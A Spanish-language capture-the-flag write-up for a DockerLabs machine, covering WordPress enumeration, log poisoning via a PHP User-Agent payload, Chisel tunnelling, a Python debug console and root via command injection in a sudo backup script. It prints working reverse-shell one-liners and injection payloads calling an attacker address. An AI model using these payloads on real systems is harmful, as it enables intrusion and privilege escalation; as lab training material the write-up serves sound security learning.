
**IP**:  172.17.0.2
**S.O**: Linux
**Source:** DockeLabs
**Level:** Fácil
**Date:** 23 diciembre 2025
**Autor**:
**Descripción**: 

Web Enumeration
Fuzzing with gobuster
Enumeración de WordPress con wpscan
WordPress RCE vía LFI + Log Poisoning
User-Agent Injection with Burp Suite
Chisel Port Forwarding (Reenvío de Puertos)
Ejecución Remota de Código a través de la Consola de Depuración Python
[[Escalada de Privilegios#**Escalada de Privilegios mediante Sudo**]] - wp, mediante Inyección de Comandos en un Script Sudo

**Flags**:  


**Begin**:

---

### **Reconocimiento**:

Comenzamos haciendo un ping:
![Pasted image 20260113191428.png](../../_assets/ed8398880872edca57762927143b3ccf4dd896ef8d5d09e248e5831835114e70.png)
Hay conexión 
TTL: 64 -> Linux

Hacemos un escaneo de puertos
![Pasted image 20260113191435.png](../../_assets/017fb4f97c5f78f1976a6ea0b806b63ce1292488456b43a4e519e5cc0c18056e.png)
Puertos abiertos: 
Puertos 80 (HTTP)

### **Enumeración**

Accedemos a la pagina web
![Pasted image 20260113191444.png](../../_assets/b4d9bb6e578c6cc1754058d3f17d21c414dcc9d1cefa4c71866867164a401c36.png)
Nos redirige al dominio `bicho.dl`.

Agregamos aquel nombre de dominio a `/etc/hosts`
![Pasted image 20260113191451.png](../../_assets/9371892e77c3e2f1da60aaee31b0032c4c692b3498c7505afd347285697b3281.png)

Logramos visualizar la pagina web
![Pasted image 20260113191458.png](../../_assets/e9cd347600f84fa320a6cfafe63353978b1797cfaf3c69cda0bd4a81bdf73429.png)

Vemos las tecnologías que corren detrás de la pagina web.
![Pasted image 20260113191512.png](../../_assets/3979b1f165f8eca9652c794c1c7d49858d00b4a8f8198e0f6a2aeea5a4083e4c.png)

Realizamos un fuzzing de directorios.
![Pasted image 20260113191521.png](../../_assets/7f6e85cda750f2da9c2d2bfe3c741260d9980fb52dc9bcef13927fe905f27edf.png)
Vemos varis directorios de wordpress.

Nos dirigimos al sitio donde poder logearnos
![Pasted image 20260113191530.png](../../_assets/09b0120177aebda828dee27a3325daa9de57a5eedb8bc49e54b8404eb54c6a90.png)


Realizamos una enumeración con [[wpscan]]
```bash
wpscan -e p,vt,cb,u --url http://bicho.dl
```
WPScan, una herramienta de escaneo de seguridad para sitios web basados en WordPress. El comando está diseñado para realizar una enumeración agresiva de información sensible en el objetivo.

* -e significa **enumerate** (enumerar)
* p **(Plugins)**: Busca plugins instalados en el sitio. Por defecto, busca los plugins más populares (mixed detection). Saber qué plugins tiene el sitio es crucial para buscar vulnerabilidades específicas (CVEs) en ellos. 
* vt **(Vulnerable Themes)**: Escanea específicamente temas (themes) que se sabe que tienen vulnerabilidades de seguridad. A diferencia de t (que busca cualquier tema), vt se centra en los que son peligrosos. Usuario bicho encontrado. No se logro encontrar una contraseña con: wpscan -U bicho -P /usr/share/wordlists/rockyou.txt --url bicho.dl Al haber ejecutado el comando wpscan , el reporte de wpscan indica que hay un fichero con extensión .log (http://bicho.dl/wp-content/debug.log) el cual se encuentra disponible para 
* cb **(Config Backups)**: Busca copias de seguridad de archivos de configuración (ej. wpconfig.php.bak , wp-config.php.old ). 
* u **(Users)**: Intenta enumerar los nombres de usuario válidos (autores) del sitio. Generalmente lo hace analizando los IDs de autor (/?author=1) o los mensajes de error de inicio de sesión.

![Pasted image 20260113191746.png](../../_assets/8512b364499c5b4e30a01fa9ff1044aee666b6abac86a37cea2e69df122b492c.png)
![Pasted image 20260113191755.png](../../_assets/74dcbda8e980d5f0370cd5a4dda398ea5785b1db09361d3a2120a3517283eb4c.png)
Encontramos un usuario llamado `bicho`.

Usuario bicho encontrado.

No se logro encontrar una contraseña con: `wpscan -U bicho -P /usr/share/wordlists/rockyou.txt --url bicho.dl`

Al haber ejecutado el comando wpscan , el reporte de wpscan indica que hay un fichero con extensión .log (http://bicho.dl/wp-content/debug.log) el cual se encuentra disponible para revisar:
![Pasted image 20260113191851.png](../../_assets/de055005f6091b143500557e645defe96740ac5527e0d2795c7a2ef9b8acba19.png)
Al verlo mas a profundo vemos que puede ser vulnerable a **log possioning**

Log Poisoning (envenenamiento de logs) es una técnica de ciberataque que permite a un atacante inyectar código malicioso en los archivos de registro (logs) de un servidor.

`http://bicho.dl/wp-content/debug.log `Aqui se registran los logs que intentaremos envenenar.

`http://bicho.dl/wp-login.php` Aqui es donde inyectaremos el payload.

### **Explotación**

Codificaremos en base64 la cadena que nos entablará una reverse shell:
```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" | base64
```
![Pasted image 20260113192001.png](../../_assets/b5bfcb23a752a9fc32b9b8267fe4adfc39cd9f297e18e42c55c02d619627d049.png)

Y en una petición de login que hemos capturado con Burp Suite, modificaremos el valor de la cabecera User-Agent por código en PHP, el cual, al guardarse en el log, al nosotros acceder al mismo, se interpretará y se ejecutará:
![Pasted image 20260113192017.png](../../_assets/110becb05f0af88d3c5815596e57467e773ec0c650fe8241e4a2588040f06ad3.png)

Codigo en php:
```
<?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= |
base64 -d | bash`; ?>
```

Ponemos en escucha el puerto 4444.
![Pasted image 20260113192037.png](../../_assets/12274fb6d4f43dbd8a3a24f7ea65eb594a18f4bba9e0e7796bb562df7d647585.png)

Y pegamos el payload de php en el repetidor.
![Pasted image 20260113192050.png](../../_assets/54a82066ae5645b8b9965e05b8c1a6f631414549287ad274f63acb9de0198b02.png)
y le damos a send .

![Pasted image 20260113192101.png](../../_assets/24c409375616a1063fa9a31af94d9c049bd391c132d1a8ef3a17115f430394bb.png)
Nos dice `ok`.


Y en el puerto de escucha nos da la Reverse Shell.
![Pasted image 20260113192126.png](../../_assets/cd932b643c5b7173df5a6ea7e7a11cd1a3df510f0ede4703e6698fe3bbc02022.png)

Para poder escalar privilegio, después de revisar varias alternativas 
Nos fijamos en las conexiones de red en el sistema.
```bash
netstat -tuln
```
![Pasted image 20260113192150.png](../../_assets/536a38fa4aa10f9f50c78e9eebbb437bb0092dcdb0370f46f8d58269cba9976d.png)
Vemos que el puerto 5000 esta abierto, pero no lo podemos ver desde nuestra maquina, asi que utilizaremos la herramienta **Chisel** que nos permitirá crear un túnel seguro desde la máquina víctima hacia nuestra máquina atacante, redirigiendo el tráfico de ese puerto privado a un puerto accesible de nuestra máquina.

Primero nos montamos un servidor python3 para que podamos descargar chisel desde la maquina victima.
```bash
python3 -m http.server 80
```
![Pasted image 20260113192249.png](../../_assets/b73ceee41f79ec71aebafcb200e028b4facd7a02d1e706837c57a6309b57a641.png)

Descargamos en la maquina la herramienta
![Pasted image 20260113192301.png](../../_assets/b1f9f8f4da810bc05089184dd269437c705f00abda62d67938e696f93ceb6cf8.png)

Le damos permisos de ejecucion:
![Pasted image 20260113192312.png](../../_assets/269b4ceb46a87d9867387c6e21e6c00240797bb9cf8d5345673a427b9b423906.png)

Ahora levantamos un puerto servidor en nuestra maquina atacante
![Pasted image 20260113192325.png](../../_assets/62c8dabeb7b528a4ae4ca124cc9d7e3a31be2c4e7fafb3ba883063009bd2393d.png)


En la máquina víctima, ejecutaremos el binario como cliente, conectándonos al puerto indicado en nuestra máquina, indicando que se trata de una conexión reversa (R:) a un cierto puerto de la máquina destino(5000), y la IP y el puerto de la maquina que queremos redireccionar (127.0.0.1:5000)
![Pasted image 20260113192533.png](../../_assets/e118f643bffcffe1bf46cd7e58a8d0c47433a64115124b0b6d077bb5ed35f719.png)


`http://127.0.0.1:5000/ `--> Ahora podremos acceder al recurso que antes no estaba expuesto.
![Pasted image 20260113192548.png](../../_assets/1d491b9a73b1fcbff24f676c882ea10eec98673d6bd7f07efe4ad87ec5f3fe2f.png)

Hacemos fuzzing con gobuster:
![Pasted image 20260113192600.png](../../_assets/24f74f5160af2df360cfd0dba5e2d2a048155feaa88bbfe51422e4ba55dc1fea.png)


Tenemos una consola interactiva y corre python por detrás
![Pasted image 20260113192612.png](../../_assets/63c46bc8c6ca87621c6778450b839e8d64e9991d0b496fb76922b089d64abdbd.png)

Entonces de revshells.com generamos una RCE con nuestra direccion ip y el puerto `9001` de escucha y lo inyectamos en la consola interactiva.
![Pasted image 20260113192623.png](../../_assets/5dc6df3eb7e02adcd544d4ca364fd4859ab0ebf1f0cd76044b11fd8faef2b46e.png)

Ponemos el puerto en escucha
![Pasted image 20260113192629.png](../../_assets/068a9623f59ca89b6518fd5017c2c1f22c73143a82c5e9a9a7ea3e20e63e5523.png)

Inyectamos
![Pasted image 20260113192635.png](../../_assets/64ce4a2d18b88c91b52c218f918124e0073bc86f638414cb477baabeef66a55c.png)

Y conseguimos la Reverse Shell.
![Pasted image 20260113192642.png](../../_assets/2d3e9ef2e660053bac72ea7af36e4131d89835361289c0cf7e6c378798cc5923.png)

### **Post-Explotación**

Listamos los permisos sudo
![Pasted image 20260113192649.png](../../_assets/9a0476ee3abf8144e29bb149404a9c7715f59fea75dae8d63e08ce99fa558356.png)
Vemos que podemos usar `wp` como el usuario `wpuser` sin la necesidad de una contraseña.

El binario es el que se encarga de desplegar WordPress, y revisando la documentación, nos indican que a la hora de ejecutarlo podemos pasarle el parámetro --exec y una instrucción en PHP que ejecutará al iniciar:
![Pasted image 20260113192703.png](../../_assets/9f1b6170bcc613d62cbf6a806c04e3f5eb1f64b76893b46bb76ff2bd483cb87a.png)

Construimos un comando para obtener una Shell como el usuario `wpuser`
```bash
sudo -u wpuser /usr/local/bin/wp --exec="system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/4545 0>&1\"');"
```

Ponemos el puerto 4545 en escucha
![Pasted image 20260113192730.png](../../_assets/1123a1df83ebd86f4ace685b0de780f7cab1e8e4ddd264b5404da592071fee24.png)

Ejecutamos el comando 
![Pasted image 20260113192744.png](../../_assets/875d9bd7411a636be1d031ab6288a06ff51d7f38c6bac20ec3c9fefb8f275fb4.png)

Y obtenemos una Shell remota como el usuario `wpuser`
![Pasted image 20260113192751.png](../../_assets/700c54655a1e0f3ab7ba87bf939d24f81e0ffd0afddb407bf91ac8b96483c538.png)

Listamos los permisos sudo
![Pasted image 20260113192757.png](../../_assets/bb914b7b2478c7070f67f2a302005e23b9dd11d07b1b00230822133ab14e9edc.png)

Haciendo un `ls -la `vemos que no tiene permisos de editar.
Pero podemos leerlo.
`wpuser@92ea9e1ae4c3:/tmp$ cat /opt/scripts/backup.sh`

```bash
#!/bin/bash 
# Author: Álvaro Bernal (aka. trr0r) 
# backup.sh: Realiza una copia de un log en una ubicación determinada (/backup)
# COLORES 
greenColour="\e[0;32m\033[1m" 
endColour="\033[0m\e[0m" 
redColour="\e[0;31m\033[1m" 
blueColour="\e[0;34m\033[1m" 
yellowColour="\e[0;33m\033[1m" 
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m" 
grayColour="\e[0;37m\033[1m" 
orangeColour="\e[38;5;214m\033[1m" 
darkRedColour="\e[38;5;124m\033[1m" 
if [ $# -eq 0 ]; then 
    echo -e "\n${redColour}[!] Error, debes de proporcionar un argumento.${endColour}\n\n\t${blueColour}Example:${endColour} ${greenColour}/opt/scripts/backup.sh access${endColour}\n"
     exit 
fi 
# Variables GLOBALES 
LOG_DIR="/var/log/apache2" 
BACKUP_DIR="/backup"
LOG_NAME=$1 
FULL_NAME="$LOG_DIR/$LOG_NAME.log" 
/usr/bin/echo "Realizando copia de $FULL_NAME en $BACKUP_DIR" 
COMMAND="/usr/bin/cp $FULL_NAME $BACKUP_DIR" 
eval $COMMAND
```

Al leer el script vemos que: los argumentos que le pasemos al script se ven reflejados directamente en los argumentos del comando que se va a ejecutar posteriormente

Entonces:
```bash
sudo /opt/scripts/backup.sh; whoami
```


Entonces podemos llegar a inyectar comandos en la ejecución de la siguiente manera, haciendo que el binario /bin/bash tenga permisos SUID:
```bash
sudo /opt/scripts/backup.sh "access;chmod u+s /bin/bash;"
```

Ejecutamos el comando:
```bash
/bin/bash -p
```

Y logramos obtener una Shell con permisos de **root**
```
bash-5.2# whoami 
root
```
Escalada exitosa a root.